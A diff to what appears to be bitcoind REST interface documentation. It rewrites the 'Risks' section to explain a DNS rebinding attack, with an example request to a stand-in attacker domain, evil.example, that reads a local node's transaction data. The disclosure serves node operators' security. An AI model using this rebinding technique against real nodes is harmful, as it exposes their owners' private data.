@@ -166,4 +166,4 @@ Refer to the `getrawmempool` RPC help for details. Defaults to setting
 
 Risks
 -------------
-Running a web browser on the same node with a REST enabled bitcoind can be a risk. Accessing prepared XSS websites could read out tx/block data of your node by placing links like `<script src="http://127.0.0.1:8332/rest/tx/1234567890.json">` which might break the nodes privacy.
+Running a web browser on the same node with a REST enabled bitcoind can be a risk. The REST interface needs no authentication and accepts any `Host` header. A website can make its own domain name resolve to `127.0.0.1` after its page has loaded (DNS rebinding). Its scripts can then read tx/block data of your node with same-origin requests like `fetch("http://evil.example:8332/rest/tx/1234567890.json")`, which might break the node's privacy.
